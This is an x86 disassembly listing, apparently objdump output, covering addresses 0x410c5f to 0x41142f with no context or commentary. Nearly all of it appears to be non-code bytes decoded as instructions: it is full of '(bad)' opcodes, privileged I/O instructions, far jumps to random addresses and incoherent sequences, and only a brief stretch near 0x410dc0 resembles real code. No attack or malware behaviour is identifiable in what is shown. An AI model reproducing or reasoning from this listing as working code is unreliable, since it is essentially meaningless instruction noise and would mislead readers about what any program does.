  410c5f:	ins    DWORD PTR es:[edi],dx
  410c60:	or     esp,0x7f
  410c63:	push   ds
  410c64:	and    cl,bl
  410c66:	xor    ebp,ebx
  410c68:	repnz aaa 
  410c6a:	sahf   
  410c6b:	in     eax,0x25
  410c6d:	addr16 pop esi
  410c6f:	call   0x42384fe7
  410c74:	mov    dh,0x4a
  410c76:	int3   
  410c77:	cs push cs
  410c79:	ins    DWORD PTR es:[edi],dx
  410c7a:	xchg   bl,bl
  410c7c:	add    ecx,ebp
  410c7e:	pushf  
  410c7f:	idiv   ecx
  410c81:	(bad)  
  410c83:	ss retf 
  410c85:	xlat   BYTE PTR ds:[ebx]
  410c86:	ss (bad) 
  410c88:	push   eax
  410c89:	pop    ss
  410c8a:	jno    0x410c6f
  410c8c:	push   ds
  410c8d:	inc    ebp
  410c8e:	jb     0x410cba
  410c90:	icebp  
  410c91:	pop    esp
  410c92:	add    DWORD PTR [esi],0x4f
  410c95:	push   0xe1921d6
  410c9a:	jecxz  0x410c77
  410c9c:	jge    0x410cd1
  410c9e:	ss xchg esi,eax
  410ca0:	and    ebp,DWORD PTR [ebx+0x4834c3]
  410ca6:	or     dl,BYTE PTR [ebp+eiz*8-0x61]
  410caa:	and    eax,0xd913da53
  410caf:	push   es
  410cb0:	push   eax
  410cb1:	push   0x2d
  410cb3:	dec    ecx
  410cb4:	and    edx,DWORD PTR [edi+edx*8-0x1929af49]
  410cbb:	sar    DWORD PTR [eax+0x7cf8a771],cl
  410cc1:	not    BYTE PTR [esi+0x55]
  410cc4:	in     al,0xa5
  410cc6:	jl     0x410cee
  410cc8:	jle    0x410c8c
  410cca:	cmp    DWORD PTR [edx-0xc],edi
  410ccd:	push   edx
  410cce:	aas    
  410ccf:	xchg   edx,eax
  410cd0:	outs   dx,DWORD PTR ds:[esi]
  410cd1:	clc    
  410cd2:	and    eax,0xb035c42f
  410cd7:	jae    0x410cda
  410cd9:	mov    esi,0x9abb6600
  410cde:	mov    ecx,0xee6e0925
  410ce3:	pop    eax
  410ce4:	enter  0x97c2,0x51
  410ce8:	stos   BYTE PTR es:[edi],al
  410ce9:	in     eax,0xec
  410ceb:	inc    ecx
  410cec:	ficom  DWORD PTR [ebp+0x4e]
  410cef:	data16 loop 0x410cbc
  410cf2:	push   edi
  410cf3:	inc    edi
  410cf4:	pop    ss
  410cf5:	test   DWORD PTR [edx],0xaca710aa
  410cfb:	mov    BYTE PTR [eax-0x69],al
  410cfe:	jne    0x410cc6
  410d00:	retf   0x7527
  410d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d04:	fstp   TBYTE PTR [edi+0x73]
  410d07:	pop    ss
  410d08:	ficomp DWORD PTR ds:0x288a31c6
  410d0e:	in     eax,0xbf
  410d10:	inc    eax
  410d11:	or     esi,DWORD PTR [ecx-0x5e]
  410d14:	ror    DWORD PTR ds:0x9ef5cbdf,cl
  410d1a:	mov    DWORD PTR [ecx-0x64d9e5f2],edx
  410d20:	dec    edi
  410d21:	mov    BYTE PTR [edx+0x71],ah
  410d24:	popa   
  410d25:	and    al,BYTE PTR [esi]
  410d27:	(bad)  
  410d28:	jns    0x410cf2
  410d2a:	cwde   
  410d2b:	jmp    0x410d9a
  410d2d:	js     0x410cd6
  410d2f:	pop    ebx
  410d30:	addr16 repnz addr16 mov ch,0xd9
  410d35:	push   es
  410d36:	inc    eax
  410d37:	inc    eax
  410d38:	fwait
  410d39:	mov    ebx,0x2cf6f7e4
  410d3e:	loope  0x410d8a
  410d40:	sub    al,BYTE PTR [ebx+0xd]
  410d43:	ret    0x8648
  410d46:	sbb    edi,edi
  410d48:	add    BYTE PTR [esi+0x23926c49],ah
  410d4e:	dec    eax
  410d4f:	cwde   
  410d50:	mov    al,0x4e
  410d52:	cmp    ebp,edx
  410d54:	jbe    0x410d0f
  410d56:	outs   dx,DWORD PTR ds:[esi]
  410d57:	mov    al,0x91
  410d59:	gs push eax
  410d5b:	test   BYTE PTR [edi-0x3a],cl
  410d5e:	xchg   esp,eax
  410d5f:	inc    ebp
  410d60:	pop    edx
  410d61:	bound  edx,QWORD PTR [ecx+0x41d21942]
  410d67:	pushf  
  410d68:	nop
  410d69:	inc    ecx
  410d6a:	test   DWORD PTR [eax],edi
  410d6c:	jecxz  0x410d38
  410d6e:	mov    ecx,0xf7ba0281
  410d73:	mov    BYTE PTR [eax],cl
  410d75:	push   ebx
  410d76:	scas   al,BYTE PTR es:[edi]
  410d77:	in     eax,dx
  410d78:	pop    ebp
  410d79:	jle    0x410d22
  410d7b:	add    DWORD PTR [ebx-0x7d],esi
  410d7e:	cwde   
  410d7f:	shl    DWORD PTR [ebp+0x1c7ab4c1],0xe2
  410d86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d87:	out    dx,al
  410d88:	cwde   
  410d89:	push   cs
  410d8a:	ror    DWORD PTR [esi+0x61a2359],0x16
  410d91:	aas    
  410d92:	pop    ecx
  410d93:	jge    0x410d90
  410d95:	push   ebp
  410d96:	fucomp st(4)
  410d98:	out    dx,eax
  410d99:	cmp    eax,0x5fc251d
  410d9e:	sub    BYTE PTR [edx],bl
  410da0:	jmp    0xb9baf55
  410da5:	loope  0x410d34
  410da7:	pop    edx
  410da8:	push   0x3d
  410daa:	cmc    
  410dab:	push   esp
  410dac:	xor    eax,0xed4eced0
  410db1:	add    ecx,ebx
  410db3:	in     al,dx
  410db4:	jbe    0x410e30
  410db6:	mov    esp,0x81068b6b
  410dbb:	repnz add BYTE PTR [eax],al
  410dbe:	add    al,al
  410dc0:	mov    DWORD PTR [ebp+0x14],edx
  410dc3:	mov    edx,DWORD PTR [esi+0x4]
  410dc6:	xor    eax,0xba699573
  410dcb:	xor    ecx,edx
  410dcd:	shrd   eax,ecx,0x2
  410dd1:	or     eax,DWORD PTR [ebp+0x10]
  410dd4:	shr    ecx,0x2
  410dd7:	mov    DWORD PTR [ebp+0x8],eax
  410dda:	mov    eax,ecx
  410ddc:	or     eax,DWORD PTR [ebp+0x14]
  410ddf:	mov    ecx,DWORD PTR [ebx]
  410de1:	mov    edx,DWORD PTR [ebx+0x4]
  410de4:	push   eax
  410de5:	push   DWORD PTR [ebp+0x8]
  410de8:	push   edx
  410de9:	push   ecx
  410dea:	call   0x41dfae
  410def:	mov    eax,DWORD PTR [esi]
  410df1:	mov    ecx,DWORD PTR [esi+0x4]
  410df4:	shrd   eax,ecx,0x2
  410df8:	shr    ecx,0x2
  410dfb:	shr    edx,0x1e
  410dfe:	jmp    0x411388
  410e03:	ret    0x707f
  410e06:	and    eax,0x58c21820
  410e0b:	cmp    DWORD PTR [ebx-0x70],ebp
  410e0e:	outs   dx,BYTE PTR ds:[esi]
  410e0f:	mul    bl
  410e11:	inc    esi
  410e12:	mov    ah,0x9b
  410e14:	push   eax
  410e15:	push   ss
  410e16:	push   ss
  410e17:	cmp    eax,0x58161604
  410e1c:	add    BYTE PTR [ebx-0x44bb7412],0x67
  410e23:	adc    BYTE PTR [esi-0x155f6910],al
  410e29:	xor    eax,DWORD PTR [edi]
  410e2b:	xchg   ebp,eax
  410e2c:	and    eax,0xc4007673
  410e31:	mov    fs,WORD PTR [ebp+0x3e4b2da9]
  410e37:	out    dx,eax
  410e38:	lock fdivr QWORD PTR ds:[eax+eax*1]
  410e3d:	dec    ebx
  410e3e:	call   0xfd15:0x4ee1780f
  410e45:	push   ecx
  410e46:	or     al,0x87
  410e48:	out    0x84,al
  410e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e4c:	loopne 0x410eb9
  410e4e:	or     BYTE PTR [ebx],dh
  410e50:	sbb    ah,dl
  410e52:	fld    QWORD PTR [ebx-0x1694429a]
  410e58:	nop
  410e59:	sbb    DWORD PTR [ecx+0x1089fc89],ebx
  410e5f:	pop    esi
  410e60:	mov    cl,0x30
  410e62:	lods   al,BYTE PTR ds:[esi]
  410e63:	aad    0x58
  410e65:	sub    DWORD PTR [edx+ebp*8],0x28
  410e69:	xchg   esp,edx
  410e6b:	lods   eax,DWORD PTR ds:[esi]
  410e6c:	fwait
  410e6d:	cmp    BYTE PTR [edi+0x1f],bl
  410e70:	aad    0xc4
  410e72:	stc    
  410e73:	rcl    BYTE PTR [eax+edx*2+0x1b4b69a9],cl
  410e7a:	adc    BYTE PTR [edi-0x61f8f91c],al
  410e80:	pop    edi
  410e81:	in     eax,dx
  410e82:	lea    edi,[ecx-0x1e342d9a]
  410e88:	sub    eax,0xc4b44d2a
  410e8d:	data16 dec BYTE PTR [ebx+0x4e]
  410e91:	mov    BYTE PTR [esi+0x182fa982],bl
  410e97:	sbb    ebp,DWORD PTR [ecx]
  410e99:	dec    edi
  410e9a:	push   ds
  410e9b:	mov    ds:0xd8bc0e5e,al
  410ea0:	aad    0xc4
  410ea2:	frstor [edi]
  410ea4:	push   edi
  410ea5:	sbb    dh,BYTE PTR [edi-0x49]
  410ea8:	call   0xa3ff23a6
  410ead:	push   eax
  410eae:	xor    BYTE PTR ds:0x154ea134,0x7f
  410eb5:	dec    edx
  410eb6:	jp     0x410e4f
  410eb8:	jo     0x410ec6
  410eba:	mov    cl,0xe9
  410ebc:	in     al,dx
  410ebd:	fwait
  410ebe:	outs   dx,DWORD PTR ds:[esi]
  410ebf:	cdq    
  410ec0:	push   cs
  410ec1:	push   esi
  410ec2:	arpl   WORD PTR [eax],bp
  410ec4:	jnp    0x410e4e
  410ec6:	cli    
  410ec7:	lods   eax,DWORD PTR ds:[esi]
  410ec8:	jbe    0x410f12
  410eca:	test   al,0xe
  410ecc:	adc    edi,DWORD PTR [eax+0x6828d1e7]
  410ed2:	fiadd  DWORD PTR [esi-0x4c]
  410ed5:	cli    
  410ed6:	pop    eax
  410ed7:	retf   
  410ed8:	sbb    esi,edi
  410eda:	fwait
  410edb:	push   ds
  410edc:	jne    0x410f42
  410ede:	adc    eax,0xd22eaeaf
  410ee3:	test   DWORD PTR [edx-0x7b054991],ebx
  410ee9:	xchg   ebp,eax
  410eea:	lds    edx,FWORD PTR [esi+eiz*1+0x4103a2de]
  410ef1:	(bad)  
  410ef2:	rol    BYTE PTR [esi+0x24584222],1
  410ef8:	test   al,0xfa
  410efa:	add    eax,0x17619130
  410eff:	sahf   
  410f00:	or     ebx,DWORD PTR [ebp+0x548fae1]
  410f06:	repnz fmul DWORD PTR [ebx+0x21]
  410f0a:	push   es
  410f0b:	jp     0x410f7c
  410f0d:	cmp    bh,bl
  410f0f:	les    esp,FWORD PTR ds:0x3e8006d4
  410f15:	jo     0x410f3c
  410f17:	(bad)  
  410f18:	inc    DWORD PTR [esi]
  410f1a:	idiv   DWORD PTR [edx+ecx*1+0x56]
  410f1e:	sbb    esp,DWORD PTR [eax]
  410f20:	jl     0x410f8a
  410f22:	sar    DWORD PTR [edi+0x5e],1
  410f25:	retf   
  410f26:	fnsave [ebp+edi*1-0x80]
  410f2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f2b:	das    
  410f2c:	outs   dx,BYTE PTR ds:[esi]
  410f2d:	sbb    eax,0x89192321
  410f32:	imul   ecx,ebx,0xf35133c0
  410f38:	push   ebp
  410f39:	dec    ecx
  410f3a:	bound  edi,QWORD PTR [edi+ebp*8]
  410f3d:	adc    eax,0xb3621190
  410f42:	adc    eax,DWORD PTR ds:0xa2937350
  410f48:	pop    es
  410f49:	out    dx,eax
  410f4a:	test   ch,ah
  410f4c:	fwait
  410f4d:	inc    esi
  410f4e:	cmp    esp,ebx
  410f50:	xor    bl,BYTE PTR ds:0xb8abbcec
  410f56:	ins    BYTE PTR es:[edi],dx
  410f57:	cs mov edi,0x52b7e92b
  410f5d:	adc    eax,0x80d236c1
  410f62:	sti    
  410f63:	sahf   
  410f64:	mov    ebp,gs
  410f66:	dec    DWORD PTR [esi+0xd284cd2]
  410f6c:	xor    DWORD PTR [ebx+eax*4+0x39],edx
  410f70:	inc    eax
  410f71:	jle    0x410f13
  410f73:	mov    bl,0x87
  410f75:	push   eax
  410f76:	loope  0x410fd8
  410f78:	or     eax,0xa3703ae1
  410f7d:	sbb    BYTE PTR [edx+ebx*4],cl
  410f80:	lods   eax,DWORD PTR ds:[esi]
  410f81:	daa    
  410f82:	cmp    ebx,DWORD PTR [ecx+0x4b]
  410f85:	xor    al,0xda
  410f87:	and    eax,0xe0c04d43
  410f8c:	xchg   edi,eax
  410f8d:	fwait
  410f8e:	adc    eax,0x699f4846
  410f93:	sub    BYTE PTR [edi-0x7b],bl
  410f96:	pop    edx
  410f97:	mov    bh,0x74
  410f99:	sbb    dl,ch
  410f9b:	pop    ss
  410f9c:	mov    esi,esi
  410f9e:	out    dx,eax
  410f9f:	mov    al,ds:0x5f8830d1
  410fa4:	mov    WORD PTR [ebx-0x7],gs
  410fa7:	ins    DWORD PTR es:[edi],dx
  410fa8:	ret    
  410fa9:	xchg   edi,eax
  410faa:	sbb    eax,0x2fbc3ea2
  410faf:	adc    eax,DWORD PTR ds:0x809ab274
  410fb5:	inc    edx
  410fb6:	xchg   edx,eax
  410fb7:	enter  0xbe2,0x3b
  410fbb:	ja     0x410feb
  410fbd:	call   0xe52:0xedac004d
  410fc4:	adc    al,0xa3
  410fc6:	icebp  
  410fc7:	dec    ecx
  410fc8:	lahf   
  410fc9:	push   ds
  410fca:	push   ebx
  410fcb:	sbb    ecx,DWORD PTR [edi-0x37]
  410fce:	out    0xd1,eax
  410fd0:	jns    0x41101e
  410fd2:	or     bl,BYTE PTR [ebp-0x2831ae8f]
  410fd8:	sar    BYTE PTR [esi-0x1f],0xa0
  410fdc:	aam    0x25
  410fde:	aam    0xff
  410fe0:	gs fs cli 
  410fe3:	xchg   esi,eax
  410fe4:	enter  0x1ea9,0xa9
  410fe8:	jo     0x410fb2
  410fea:	out    0x99,eax
  410fec:	aas    
  410fed:	push   0xffffffef
  410fef:	mov    eax,ds:0xe684da69
  410ff4:	inc    edx
  410ff5:	dec    esp
  410ff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ff7:	mov    dl,0x2
  410ff9:	push   edx
  410ffa:	pushf  
  410ffb:	(bad)  
  410ffc:	mov    WORD PTR [edi-0x11],cs
  410fff:	or     dl,0xf6
  411002:	push   esi
  411003:	add    ch,dl
  411005:	pushf  
  411006:	je     0x410fd7
  411008:	sub    DWORD PTR [edx+0x3d5b6f82],ebx
  41100e:	pushf  
  41100f:	test   DWORD PTR [edi-0x2163f7c3],ebx
  411015:	cmp    ebp,DWORD PTR [ebp-0x5794c31c]
  41101b:	or     eax,DWORD PTR [esi-0x2e9a5a56]
  411021:	sub    cl,ch
  411023:	jg     0x410fb6
  411025:	jecxz  0x411049
  411027:	xchg   edx,eax
  411028:	or     BYTE PTR [ebx],ch
  41102a:	rol    DWORD PTR ds:0x54dfa8a5,0xff
  411031:	pop    eax
  411032:	outs   dx,DWORD PTR ds:[esi]
  411033:	mov    esp,DWORD PTR fs:[esi-0x2b]
  411037:	mov    WORD PTR [ecx-0x34],?
  41103a:	out    dx,eax
  41103b:	clc    
  41103c:	adc    ebx,DWORD PTR [edi+0x3367ca47]
  411042:	jae    0x41104c
  411044:	adc    ebp,DWORD PTR [esi]
  411046:	nop
  411047:	mov    ebx,0x9dd22ca3
  41104c:	push   ecx
  41104d:	jae    0x41108f
  41104f:	mov    dl,0xa8
  411051:	fldenv [edi]
  411053:	pop    ebx
  411054:	adc    DWORD PTR [esi-0x63afde24],ecx
  41105a:	fs (bad) 
  41105c:	leave  
  41105d:	jbe    0x411054
  41105f:	jae    0x411004
  411061:	popa   
  411062:	out    dx,al
  411063:	jb     0x4110cf
  411065:	adc    eax,0x7cf0f9a4
  41106a:	bnd call 0x7236e560
  411070:	repnz in eax,0x4c
  411073:	jmp    0xca995
  411078:	leave  
  411079:	dec    ecx
  41107a:	out    dx,al
  41107b:	int    0x8
  41107d:	push   0xb0c64fa6
  411082:	inc    ecx
  411083:	mov    bl,0x8e
  411085:	push   ebx
  411086:	sub    esi,DWORD PTR ds:0x87e4646f
  41108c:	ins    BYTE PTR es:[edi],dx
  41108d:	shr    BYTE PTR [ebx+0x47eb416a],1
  411093:	jl     0x4110d8
  411095:	jmp    0xd008:0x66e6829b
  41109c:	sub    BYTE PTR [ecx+0x26],0x54
  4110a0:	outs   dx,DWORD PTR ds:[esi]
  4110a1:	inc    ebx
  4110a2:	daa    
  4110a3:	fld    TBYTE PTR [edx+0x748c42af]
  4110a9:	cmp    edx,DWORD PTR [ebp-0x640619ac]
  4110af:	icebp  
  4110b0:	out    0xe2,eax
  4110b2:	xor    DWORD PTR [eax+0x5c],ebx
  4110b5:	cmp    BYTE PTR [edi+0x71ad459],0xff
  4110bc:	sub    ebx,DWORD PTR [eax-0x70]
  4110bf:	xchg   edx,eax
  4110c0:	int3   
  4110c1:	add    al,0x19
  4110c3:	pop    ss
  4110c4:	push   ecx
  4110c5:	fmul   DWORD PTR [edx+ecx*1]
  4110c8:	jg     0x411060
  4110ca:	sub    DWORD PTR [eax+eax*1],ecx
  4110cd:	xor    esp,ebp
  4110cf:	adc    eax,0xc0fdd8f0
  4110d4:	xor    eax,0xd1296472
  4110d9:	pushf  
  4110da:	cmp    bl,BYTE PTR [edx+0x16]
  4110dd:	test   eax,0x5f488542
  4110e2:	shl    BYTE PTR [edi-0x7a],0x22
  4110e6:	add    cl,ah
  4110e8:	push   esi
  4110e9:	addr16 sahf 
  4110eb:	jns    0x4110ff
  4110ed:	test   eax,0x5ec0d395
  4110f2:	out    0x0,eax
  4110f4:	fsubr  st,st(7)
  4110f6:	in     al,dx
  4110f7:	and    esp,ebp
  4110f9:	xchg   ecx,eax
  4110fa:	push   ebp
  4110fb:	mov    edx,ss
  4110fd:	xor    eax,0xc309e6a5
  411102:	sbb    cl,BYTE PTR [esi]
  411104:	(bad)  
  411105:	in     eax,dx
  411106:	add    eax,0xf70aec20
  41110b:	out    0x1b,eax
  41110d:	loopne 0x411175
  41110f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411110:	jmp    FWORD PTR [edi]
  411112:	js     0x4110fe
  411114:	test   eax,0xbeaf21c0
  411119:	mov    ds:0xfd958846,al
  41111e:	inc    ebp
  41111f:	xor    eax,0x9a865faf
  411124:	push   eax
  411125:	jl     0x4110ae
  411127:	stc    
  411128:	stc    
  411129:	ja     0x4110e7
  41112b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41112c:	adc    dl,BYTE PTR [ebx-0x47]
  41112f:	push   esp
  411130:	daa    
  411131:	or     eax,DWORD PTR [esi-0x1e0eb22a]
  411137:	xchg   esi,eax
  411138:	mov    esp,0x79ee8e15
  41113d:	test   eax,edi
  41113f:	ss inc edx
  411141:	cmc    
  411142:	fcomp  st(6)
  411144:	cmp    eax,0x378664bb
  411149:	gs xchg edx,eax
  41114b:	je     0x41115e
  41114d:	in     eax,0x8c
  41114f:	icebp  
  411150:	push   cs
  411151:	stos   DWORD PTR es:[edi],eax
  411152:	ss adc bl,al
  411155:	enter  0x8f46,0x3b
  411159:	in     eax,0x6e
  41115b:	cli    
  41115c:	xchg   edi,eax
  41115d:	xor    DWORD PTR [esi],0xffffffe9
  411160:	imul   edx,DWORD PTR [edx+ecx*1],0xbcf4b8cf
  411167:	xchg   ebx,eax
  411168:	les    ebx,FWORD PTR [eax+0x1c]
  41116b:	in     al,0xad
  41116d:	xchg   esi,eax
  41116e:	jb     0x411108
  411170:	(bad)  
  411171:	shr    BYTE PTR [ecx+0x4e],cl
  411174:	add    al,dl
  411176:	loope  0x411148
  411178:	mov    dl,0x89
  41117a:	out    0xf5,eax
  41117c:	iret   
  41117d:	pop    esi
  41117e:	push   es
  41117f:	pop    esi
  411180:	jbe    0x411159
  411182:	mov    dl,0x4e
  411184:	es pop esp
  411186:	jle    0x41112c
  411188:	add    bl,BYTE PTR [edx+eax*8-0x7cd35a10]
  41118f:	rol    BYTE PTR [eax],cl
  411191:	sbb    ah,BYTE PTR [esi+0xe2aeb91]
  411197:	inc    ecx
  411198:	jmp    0x2c9786b5
  41119d:	es inc esi
  41119f:	inc    ebx
  4111a0:	mov    al,0x3c
  4111a2:	ja     0x4111d1
  4111a4:	jns    0x41117b
  4111a6:	(bad)  
  4111a7:	sub    ch,ah
  4111a9:	push   cs
  4111aa:	pop    ss
  4111ab:	shl    BYTE PTR [edi-0x38],1
  4111ae:	jns    0x4111b7
  4111b0:	addr16 xchg ebx,eax
  4111b2:	out    dx,al
  4111b3:	mov    esi,0xd4fd506a
  4111b8:	push   edx
  4111b9:	loope  0x411195
  4111bb:	push   0x2de28f07
  4111c0:	inc    ebp
  4111c1:	mov    ecx,edi
  4111c3:	pop    es
  4111c4:	jl     0x411161
  4111c6:	imul   ecx
  4111c8:	lfs    esp,FWORD PTR [ebx]
  4111cb:	popf   
  4111cc:	sbb    bl,dl
  4111ce:	rol    bh,cl
  4111d0:	add    eax,0xc7c25e98
  4111d5:	mul    ebp
  4111d7:	sbb    eax,DWORD PTR [eax+0x27]
  4111da:	stos   BYTE PTR es:[edi],al
  4111db:	sub    DWORD PTR [edi-0x332c1f85],ebx
  4111e1:	(bad)  
  4111e2:	and    al,0x3a
  4111e4:	sbb    eax,0x20283863
  4111e9:	sub    ah,dl
  4111eb:	stos   DWORD PTR es:[edi],eax
  4111ec:	inc    edx
  4111ed:	jns    0x4111f6
  4111ef:	and    eax,DWORD PTR [esi]
  4111f1:	push   edi
  4111f2:	push   eax
  4111f3:	data16 sbb BYTE PTR [edi],0x7d
  4111f7:	stos   BYTE PTR es:[edi],al
  4111f8:	pop    ebx
  4111f9:	dec    eax
  4111fa:	inc    edi
  4111fb:	ss jecxz 0x4111a4
  4111fe:	(bad)  
  411200:	clc    
  411201:	fld    QWORD PTR [edx-0x2c80c856]
  411207:	(bad)  
  411209:	or     esi,DWORD PTR [ebp-0x5fdc0ce0]
  41120f:	retf   0x705a
  411212:	or     esi,DWORD PTR [edi-0x2429fdba]
  411218:	sbb    ch,dl
  41121a:	and    ah,BYTE PTR [eax]
  41121c:	mov    edx,DWORD PTR [ecx+0x4a]
  41121f:	jge    0x4111ab
  411221:	scas   eax,DWORD PTR es:[edi]
  411222:	sbb    al,0x91
  411224:	add    cl,bh
  411226:	jle    0x411253
  411228:	cmp    dh,BYTE PTR [ebx-0x3e]
  41122b:	clc    
  41122c:	sar    DWORD PTR [di-0x5ee5],0x2a
  411232:	shl    edi,1
  411234:	mov    ah,0xc8
  411236:	xchg   ebp,eax
  411237:	xor    al,0x8f
  411239:	bound  edi,QWORD PTR [edx+0x86e4529]
  41123f:	sub    ecx,esi
  411241:	inc    ebp
  411242:	push   esi
  411243:	pop    edx
  411244:	inc    ebp
  411245:	sar    BYTE PTR [edi+0x51],cl
  411248:	in     eax,0xc1
  41124a:	dec    eax
  41124b:	push   ebp
  41124c:	mov    ebx,0x42870a98
  411251:	or     DWORD PTR es:[ecx],esi
  411254:	jmp    0xe76f:0xa8107567
  41125b:	jge    0x411284
  41125d:	xor    al,0x6e
  41125f:	jb     0x41122c
  411261:	retf   
  411262:	cmc    
  411263:	or     al,0x58
  411265:	sbb    eax,0xa8a726b
  41126a:	retf   
  41126b:	add    al,0xa4
  41126d:	icebp  
  41126e:	mov    eax,0x4cd04064
  411273:	sub    bl,BYTE PTR [ebx]
  411275:	retf   0xe5b3
  411278:	adc    al,0xcc
  41127a:	fcom   DWORD PTR [ebp+0x493d0f9]
  411280:	sub    eax,DWORD PTR [edi+0x3348429f]
  411286:	(bad)
  411289:	sahf   
  41128a:	lahf   
  41128b:	cdq    
  41128c:	xchg   esi,eax
  41128d:	or     esp,ebx
  41128f:	aam    0x42
  411291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411292:	sbb    ebp,DWORD PTR [ebp+0x266d8d89]
  411298:	outs   dx,DWORD PTR ds:[esi]
  411299:	test   BYTE PTR [edi+ecx*8+0x658a1371],0xfc
  4112a1:	cmp    dh,BYTE PTR [edi-0x30b08011]
  4112a7:	dec    edi
  4112a8:	(bad)  
  4112a9:	mov    bh,0xc5
  4112ab:	(bad)  
  4112ac:	pop    esi
  4112ad:	fucomp st(5)
  4112af:	sub    al,cl
  4112b1:	fstp   DWORD PTR [ebx-0x49]
  4112b4:	pop    edx
  4112b5:	loope  0x411327
  4112b7:	inc    eax
  4112b8:	inc    eax
  4112b9:	scas   al,BYTE PTR es:[edi]
  4112ba:	or     ebx,ebx
  4112bc:	lock dec ebx
  4112be:	mov    bh,0x5b
  4112c0:	inc    ebx
  4112c1:	ds cmp eax,0xf4e09006
  4112c7:	in     eax,0xb5
  4112c9:	sbb    bh,bh
  4112cb:	xchg   cx,ax
  4112cd:	(bad)  
  4112cf:	ret    0xf952
  4112d2:	mov    esi,0x28a70a1f
  4112d7:	cmp    al,0x7c
  4112d9:	dec    edi
  4112da:	arpl   WORD PTR cs:[ebp+0x1a919423],di
  4112e1:	and    al,0x4a
  4112e3:	push   eax
  4112e4:	lds    edx,FWORD PTR ds:0x894d6b98
  4112ea:	dec    eax
  4112eb:	push   esp
  4112ec:	mov    esp,0xe7f94d19
  4112f1:	cmp    eax,0x6662b125
  4112f6:	jns    0x41127b
  4112f8:	sub    bl,ch
  4112fa:	sahf   
  4112fb:	jge    0x411348
  4112fd:	pop    ss
  4112fe:	in     eax,0x3d
  411300:	call   0x80c6cddf
  411305:	sar    BYTE PTR [ebp+0x771bb3e9],cl
  41130b:	mov    WORD PTR [esi-0x1e],gs
  41130e:	add    eax,0xc887f92
  411313:	inc    edx
  411314:	(bad)  
  411315:	adc    al,0xbb
  411317:	fisubr DWORD PTR [ecx+edx*8+0x364f85fe]
  41131e:	dec    edx
  41131f:	(bad)  
  411321:	or     edx,DWORD PTR [ebx]
  411323:	arpl   WORD PTR [esi-0x69],ax
  411326:	clc    
  411327:	in     al,dx
  411328:	test   DWORD PTR [edi-0x4a],esi
  41132b:	sub    al,dl
  41132d:	aas    
  41132e:	shl    ecx,cl
  411330:	inc    esp
  411331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411332:	push   eax
  411333:	sbb    al,0x8a
  411335:	out    0x89,al
  411337:	shl    BYTE PTR [ebx],0x5c
  41133a:	out    dx,al
  41133b:	aas    
  41133c:	stos   BYTE PTR es:[edi],al
  41133d:	xchg   esi,eax
  41133e:	jmp    0x9e3da636
  411343:	mov    ah,0xf0
  411345:	xor    DWORD PTR [edx],edi
  411347:	inc    ebx
  411348:	cmp    al,cl
  41134a:	shl    DWORD PTR [esi],1
  41134c:	jmp    0x4113aa
  41134e:	and    al,ch
  411350:	(bad)  
  411351:	shl    BYTE PTR ds:0xfa0eae48,1
  411357:	(bad)  
  411358:	mov    BYTE PTR [ecx+edx*1+0x2],al
  41135c:	sub    bh,BYTE PTR ds:0xe7c9cac2
  411362:	mov    ecx,0x3521058b
  411367:	mov    ah,0xb7
  411369:	or     eax,0xc5e6fd23
  41136e:	leave  
  41136f:	test   BYTE PTR [edx+0x26737d0a],0x57
  411376:	into   
  411377:	pop    esp
  411378:	push   edi
  411379:	ss mov esp,0xd9961a54
  41137f:	adc    eax,0xc6071bba
  411384:	lds    ebp,FWORD PTR [ecx+0x44]
  411387:	and    eax,DWORD PTR [ecx+0x2a276f1]
  41138d:	out    0x51,eax
  41138f:	xor    eax,edi
  411391:	mov    DWORD PTR [ebp+0x10],edx
  411394:	jmp    0x41191e
  411399:	jl     0x4113d8
  41139b:	mov    ds:0x1459a28b,eax
  4113a0:	inc    eax
  4113a1:	jmp    DWORD PTR [eax+0x7685b440]
  4113a7:	mov    al,0xae
  4113a9:	rol    BYTE PTR [esi+0x16],1
  4113ac:	push   ss
  4113ad:	cmp    eax,0x1161604
  4113b2:	pop    eax
  4113b3:	mov    ebp,0xf9615c2d
  4113b8:	enterw 0xb0c6,0xde
  4113bd:	pop    eax
  4113be:	xchg   edx,esp
  4113c0:	pop    esp
  4113c1:	pop    ds
  4113c2:	jmp    0x411414
  4113c4:	daa    
  4113c5:	sub    BYTE PTR [esi+0x25],al
  4113c8:	test   DWORD PTR [edx-0x465fde10],edi
  4113ce:	cld    
  4113cf:	lock mov ds:0x9c8e7674,eax
  4113d5:	push   ss
  4113d6:	jle    0x4113d8
  4113d8:	xchg   esi,eax
  4113d9:	loopne 0x411405
  4113db:	add    al,0x4f
  4113dd:	ins    DWORD PTR es:[edi],dx
  4113de:	scas   al,BYTE PTR es:[edi]
  4113df:	dec    esi
  4113e0:	jp     0x41144a
  4113e2:	das    
  4113e3:	mov    dh,ah
  4113e5:	rcl    esi,cl
  4113e7:	cli    
  4113e8:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4113ea:	inc    ebx
  4113eb:	stc    
  4113ec:	call   0x888a21af
  4113f1:	mov    eax,ds:0x67de2b8c
  4113f6:	cmp    BYTE PTR [edi-0x41],0x20
  4113fa:	fisub  DWORD PTR [ecx-0x6]
  4113fd:	aas    
  4113fe:	(bad)  
  4113ff:	pop    eax
  411400:	popf   
  411401:	xlat   BYTE PTR ds:[ebx]
  411402:	dec    edx
  411403:	jge    0x4113b9
  411405:	dec    eax
  411406:	mov    dl,BYTE PTR [ebp+0x6f03e222]
  41140c:	leave  
  41140d:	jp     0x411483
  41140f:	fcomp  DWORD PTR [edx]
  411411:	addr16 mov al,ds:0xb6b8
  411415:	out    0x2,eax
  411417:	call   0x91c5:0xfbc4deb1
  41141e:	or     edi,DWORD PTR [ebx+0x71]
  411421:	mov    ebp,0x3876188e
  411426:	mov    bh,0xc5
  411428:	les    edi,FWORD PTR [edx+0x64]
  41142b:	sbb    BYTE PTR [edi],bh
  41142d:	cmp    esp,DWORD PTR [edx]
  41142f:	jno    0x411489
